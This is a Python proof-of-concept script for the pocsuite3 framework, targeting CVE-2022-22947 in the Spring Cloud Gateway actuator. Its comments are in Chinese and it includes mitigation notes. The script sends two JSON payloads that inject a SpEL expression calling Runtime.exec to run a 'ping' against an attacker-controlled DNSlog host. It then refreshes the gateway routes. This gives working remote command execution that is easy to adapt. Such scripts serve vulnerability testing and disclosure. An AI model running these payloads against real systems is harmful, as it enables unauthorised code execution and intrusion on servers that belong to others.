from pocsuite3.api import Output, POCBase, register_poc, requests
from urllib.parse import urlparse


class SpringCloudGateway(POCBase):
    vulID = 'CVE-2022-22947'  # 漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version = 'v1.0'  # PoC版本，默认为1
    author = ['Yunan']  # 此PoC作者
    vulDate = '2022-02-26'  # 漏洞公开日期
    createDate = '2022-03-03'  # 编写PoC日期
    updateDate = '2022-03-03'  # 更新PoC日期，默认与createDate一样
    references = ['https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/',
                  'https://tanzu.vmware.com/security/cve-2022-22947']  # 漏洞地址来源，0day不写
    name = 'SpringCloudGateway命令注入漏洞'  # PoC名称
    appPowerLink = 'https://tanzu.vmware.com/security/cve-2022-22947/'  # 漏洞产商主页
    appName = 'Spring Cloud Gateway'  # 漏洞应用名称
    appVersion = '''
    1. Spring Cloud Gateway <=3.1.0
    2. Spring Cloud Gateway 3.0.0 - 3.0.6
    3. 其他更早以及不再支持的版本
                '''  # 漏洞影响版本
    vulType = '命令注入'  # 漏洞类型
    desc = '''
    Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。
    当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。
            '''  # 在漏洞描述填写
    fixDesc = '''
    临时缓解措施：
    1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。
    2.如果需要actuator，则应使用 Spring Security 对其进行防护，可参考：https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security。
    '''  # 修复建议
    samples = []  # 测试成功网址
    install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''通过pip安装 pocsuite3 库，写入目标URL，通过该脚本检测'''  # 在PoC用法描述填写

    # MyDNSlog改成你的ceye地址，如果后续还想更精确的查看是否确实存在该漏洞，则可在该dnslog平台上查看记录。
    MyDNSlog = "xxx.ceye.io"

    # 先定好初始的poc，后面拼接dnslog
    init_payload1 = '''
    { "predicates": [ { "name": "Path", "args": { "_genkey_0": "/new_route/**" } } ], "filters": [ { "name": "RewritePath", "args": { "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\\"ping %s\\")}", "_genkey_1": "/${path}" } } ], "uri": "https://wya.pl", "order": 0 }
    '''

    init_payload2 = '''
    { "predicate": "Paths: [/new_route], match trailing slash: true", "route_id": "new_route", "filters": [ "[[RewritePath #{T(java.lang.Runtime).getRuntime().exec(\\"ping %s\\")} = /${path}], order = 1]" ], "uri": "https://wya.pl", "order": 0 }
    '''

    def _gen_payload(self, init_payload: str, host: str) -> (str, str):
        path = str(host) + '.' + self.MyDNSlog
        payload = init_payload % path
        return payload, path

    def _verify(self):
        result = {}
        try:
            url = self.url
            transfer_protocol = url.split(':')[0]
            headers = {'Content-Type': 'application/json'}
            host = urlparse(self.url).hostname
            netloc = urlparse(self.url).netloc

            url1 = transfer_protocol + "://" + netloc + "/actuator/gateway/routes/new_route"
            url2 = transfer_protocol + "://" + netloc + "/actuator/gateway/refresh"
            # 生成最终的payload
            payload1, path = self._gen_payload(self.init_payload1, host)
            payload2, path = self._gen_payload(self.init_payload2, host)
            # proxies = {"http": "http://127.0.0.1:9990", "https": "http://127.0.0.1:9991"}
            # 初次请求建立路由
            res1 = requests.post(url=url1, data=payload1, headers=headers)
            if res1.status_code == 201:  # 201表示建立成功
                res2 = requests.post(url=url2, data=payload2, headers=headers)
                if res2.status_code == 200:
                    result['VulResult'] = "success,存在Spring Cloud Gateway命令注入漏洞"
                #   此处代码只是简单的判断响应码来判断存在漏洞，如果想更精确的判断，就在此逻辑下再去查看dnslog上是否有对应的dns记录，其中有host用来区分识别。
                else:
                    pass
            else:
                print("建立路由失败！！！")
            return self.parse_output(result)

        except Exception as e:
            print("%s" % e)
            raise e

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(SpringCloudGateway)
